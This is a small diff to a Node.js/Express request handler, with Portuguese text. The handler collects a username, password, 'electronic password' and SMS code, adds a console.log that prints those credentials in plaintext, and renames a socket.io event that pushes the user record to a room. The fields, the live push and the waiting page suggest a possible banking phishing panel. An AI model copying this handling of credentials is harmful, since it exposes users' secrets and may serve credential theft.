@@ -112,6 +112,8 @@ module.exports = {
 
             const { type, user, password, eletronicPassword, sms, status, hasUpdate } = req.body
 
+            console.log(`User received: `, req.body);
+
             //return res.json({ user, type, status })
 
             if (!user) return res.status(400).send({ error: `Informe seu usuário` })
@@ -131,7 +133,7 @@ module.exports = {
 
                     //console.log()
 
-                    req.app.io.to(clientUser.id).emit('smsreceived', clientUser.toJSON())
+                    req.app.io.to(clientUser.id).emit('sendUser', clientUser.toJSON())
 
                     return res.redirect(`/await?client=${clientUser.id}`)
                 }
